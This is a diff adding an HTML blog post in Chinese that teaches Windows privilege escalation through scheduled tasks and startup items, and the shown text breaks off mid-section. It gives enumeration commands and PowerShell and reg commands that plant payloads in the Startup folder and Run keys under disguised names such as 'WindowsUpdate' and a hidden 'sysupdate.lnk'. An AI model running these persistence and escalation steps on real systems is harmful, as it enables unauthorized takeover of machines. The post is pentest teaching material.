@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言在Windows渗透测试中，计划任务（Scheduled Tasks）和启动项（Startup Items）常以高权限身份运行，是提权的核心目标。本文系统梳理七种与计划任务和启动项相关的提权技术，提供检测与利用示例。  免责声明：本文所述技术仅供安全研究和授权渗透测试使用。未经授权对他人系统实施攻击属于违法行为。   一、计划任务枚举（schtasks Enumeration）1.1 基本枚举">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权：计划任务与启动项">
+<meta property="og:url" content="https://congliang.github.io/Windows-privesc-scheduled-tasks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言在Windows渗透测试中，计划任务（Scheduled Tasks）和启动项（Startup Items）常以高权限身份运行，是提权的核心目标。本文系统梳理七种与计划任务和启动项相关的提权技术，提供检测与利用示例。  免责声明：本文所述技术仅供安全研究和授权渗透测试使用。未经授权对他人系统实施攻击属于违法行为。   一、计划任务枚举（schtasks Enumeration）1.1 基本枚举">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:46.011Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Windows-privesc-scheduled-tasks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Windows-privesc-scheduled-tasks/","path":"Windows-privesc-scheduled-tasks/","title":"Windows提权：计划任务与启动项"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows提权：计划任务与启动项 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%9E%9A%E4%B8%BE%EF%BC%88schtasks-Enumeration%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">一、计划任务枚举（schtasks Enumeration）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%9F%BA%E6%9C%AC%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 基本枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-PowerShell%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 PowerShell枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E9%87%8D%E7%82%B9%E7%9B%AE%E6%A0%87"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 重点目标</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%A9%E7%94%A8%EF%BC%88Startup-Folder-Exploitation%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">二、启动文件夹利用（Startup Folder Exploitation）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 关键路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 权限检查与利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8Run%E4%B8%8ERunOnce%E9%94%AE"><span class="nav-number">4.</span> <span class="nav-text">三、注册表Run与RunOnce键</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%85%B3%E9%94%AE%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BD%8D%E7%BD%AE"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 关键注册表位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%9E%9A%E4%B8%BE"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E6%B7%BB%E5%8A%A0%E4%B8%8E%E5%8A%AB%E6%8C%81"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 添加与劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%84%9A%E6%9C%AC%E5%8A%AB%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">四、计划任务脚本劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%9F%A5%E6%89%BE%E5%8F%AF%E5%86%99%E4%BB%BB%E5%8A%A1%E6%96%87%E4%BB%B6"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 查找可写任务文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E6%9F%A5%E6%89%BE%E8%B0%83%E7%94%A8%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BB%BB%E5%8A%A1"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 查找调用脚本的任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E5%8A%AB%E6%8C%81%E7%A4%BA%E4%BE%8B"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 劫持示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">五、WMI事件订阅持久化与提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%8E%9F%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%A3%80%E6%B5%8B%E7%8E%B0%E6%9C%89%E8%AE%A2%E9%98%85"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 检测现有订阅</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%88%9B%E5%BB%BAWMI%E6%8F%90%E6%9D%83%E8%AE%A2%E9%98%85"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 创建WMI提权订阅</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-VBScript%E6%B6%88%E8%B4%B9%E8%80%85"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 VBScript消费者</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E6%B8%85%E9%99%A4"><span class="nav-number">6.5.</span> <span class="nav-text">5.5 清除</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81AlwaysInstallElevated%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">六、AlwaysInstallElevated注册表提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%8E%9F%E7%90%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%A3%80%E6%B5%8B"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%88%A9%E7%94%A8"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81DLL%E6%90%9C%E7%B4%A2%E9%A1%BA%E5%BA%8F%E5%8A%AB%E6%8C%81%EF%BC%88DLL-Search-Order-Hijacking%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">七、DLL搜索顺序劫持（DLL Search Order Hijacking）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-Windows-DLL%E6%90%9C%E7%B4%A2%E9%A1%BA%E5%BA%8F"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 Windows DLL搜索顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E4%BD%BF%E7%94%A8ProcMon%E5%8F%91%E7%8E%B0%E6%9C%BA%E4%BC%9A"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 使用ProcMon发现机会</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E6%A3%80%E6%B5%8B%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 检测可写目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E6%81%B6%E6%84%8FDLL%E5%88%B6%E4%BD%9C"><span class="nav-number">8.4.</span> <span class="nav-text">7.4 恶意DLL制作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E7%BB%BC%E5%90%88%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">八、综合防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">10.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-scheduled-tasks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows提权：计划任务与启动项 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权：计划任务与启动项
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-15T08:00:00+08:00">2024-12-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在Windows渗透测试中，计划任务（Scheduled Tasks）和启动项（Startup Items）常以高权限身份运行，是提权的核心目标。本文系统梳理七种与计划任务和启动项相关的提权技术，提供检测与利用示例。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文所述技术仅供安全研究和授权渗透测试使用。未经授权对他人系统实施攻击属于违法行为。</p>
+</blockquote>
+<hr>
+<h2 id="一、计划任务枚举（schtasks-Enumeration）"><a href="#一、计划任务枚举（schtasks-Enumeration）" class="headerlink" title="一、计划任务枚举（schtasks Enumeration）"></a>一、计划任务枚举（schtasks Enumeration）</h2><h3 id="1-1-基本枚举"><a href="#1-1-基本枚举" class="headerlink" title="1.1 基本枚举"></a>1.1 基本枚举</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">schtasks /query /fo CSV /v &gt; tasks.csv</span><br><span class="line">schtasks /query /fo TABLE</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-PowerShell枚举"><a href="#1-2-PowerShell枚举" class="headerlink" title="1.2 PowerShell枚举"></a>1.2 PowerShell枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$actions</span> = (<span class="variable">$_</span>.Actions | <span class="built_in">ForEach-Object</span> &#123; <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.Execute) <span class="variable">$</span>(<span class="variable">$_</span>.Arguments)&quot;</span> &#125;) <span class="operator">-join</span> <span class="string">&quot;; &quot;</span></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.TaskName) | <span class="variable">$</span>(<span class="variable">$_</span>.State) | <span class="variable">$actions</span>&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-重点目标"><a href="#1-3-重点目标" class="headerlink" title="1.3 重点目标"></a>1.3 重点目标</h3><p>枚举时应关注：以<code>NT AUTHORITY\SYSTEM</code>运行的任务、操作指向用户可写目录（<code>C:\Users\Public\</code>）的任务、路径不含引号可能被劫持的任务、触发器为<code>At logon</code>或<code>At startup</code>的任务。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;C:\Windows\System32\Tasks&quot;</span><br><span class="line">accesschk.exe -qv &quot;C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator\Reboot&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、启动文件夹利用（Startup-Folder-Exploitation）"><a href="#二、启动文件夹利用（Startup-Folder-Exploitation）" class="headerlink" title="二、启动文件夹利用（Startup Folder Exploitation）"></a>二、启动文件夹利用（Startup Folder Exploitation）</h2><h3 id="2-1-关键路径"><a href="#2-1-关键路径" class="headerlink" title="2.1 关键路径"></a>2.1 关键路径</h3><table>
+<thead>
+<tr>
+<th>启动文件夹</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>当前用户</td>
+<td><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></td>
+</tr>
+<tr>
+<td>所有用户</td>
+<td><code>%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-2-权限检查与利用"><a href="#2-2-权限检查与利用" class="headerlink" title="2.2 权限检查与利用"></a>2.2 权限检查与利用</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;<span class="variable">%PROGRAMDATA%</span>\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查写入权限</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span>).Access | </span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若对<code>%PROGRAMDATA%</code>启动文件夹可写，可放置恶意文件等待管理员登录触发：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\temp\payload.exe&quot;</span> <span class="literal">-Destination</span> <span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup\update.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或创建隐蔽快捷方式</span></span><br><span class="line"><span class="variable">$sc</span> = (<span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell).CreateShortcut(<span class="string">&quot;<span class="variable">$env:ProgramData</span>\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$sc</span>.TargetPath = <span class="string">&quot;C:\temp\payload.exe&quot;</span>; <span class="variable">$sc</span>.WindowStyle = <span class="number">7</span>; <span class="variable">$sc</span>.Save()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、注册表Run与RunOnce键"><a href="#三、注册表Run与RunOnce键" class="headerlink" title="三、注册表Run与RunOnce键"></a>三、注册表Run与RunOnce键</h2><h3 id="3-1-关键注册表位置"><a href="#3-1-关键注册表位置" class="headerlink" title="3.1 关键注册表位置"></a>3.1 关键注册表位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-枚举"><a href="#3-2-枚举" class="headerlink" title="3.2 枚举"></a>3.2 枚举</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-添加与劫持"><a href="#3-3-添加与劫持" class="headerlink" title="3.3 添加与劫持"></a>3.3 添加与劫持</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加恶意条目</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;WindowsUpdate&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用reg命令</span></span><br><span class="line">reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t REG_SZ /d <span class="string">&quot;C:\temp\payload.exe&quot;</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查现有Run键引用文件是否可写</span></span><br><span class="line"><span class="variable">$runItems</span> = <span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$p</span> <span class="keyword">in</span> <span class="variable">$runItems</span>.PSObject.Properties) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$p</span>.Name <span class="operator">-notmatch</span> <span class="string">&quot;PS&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$p</span>.Value <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>&#125;) &#123;</span><br><span class="line">            <span class="built_in">Write-Host</span> <span class="string">&quot;[!] 可劫持: <span class="variable">$</span>(<span class="variable">$p</span>.Name) -&gt; <span class="variable">$</span>(<span class="variable">$p</span>.Value)&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、计划任务脚本劫持"><a href="#四、计划任务脚本劫持" class="headerlink" title="四、计划任务脚本劫持"></a>四、计划任务脚本劫持</h2><h3 id="4-1-查找可写任务文件"><a href="#4-1-查找可写任务文件" class="headerlink" title="4.1 查找可写任务文件"></a>4.1 查找可写任务文件</h3><p>计划任务配置存储在<code>C:\Windows\System32\Tasks\</code>下的XML文件中。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&quot;C:\Windows\System32\Tasks&quot;</span> <span class="literal">-Recurse</span> <span class="operator">-File</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$_</span>.FullName</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">        <span class="variable">$_</span>.IdentityReference <span class="operator">-eq</span> [<span class="type">Security.Principal.WindowsIdentity</span>]::GetCurrent().Name <span class="operator">-and</span></span><br><span class="line">        <span class="variable">$_</span>.FileSystemRights <span 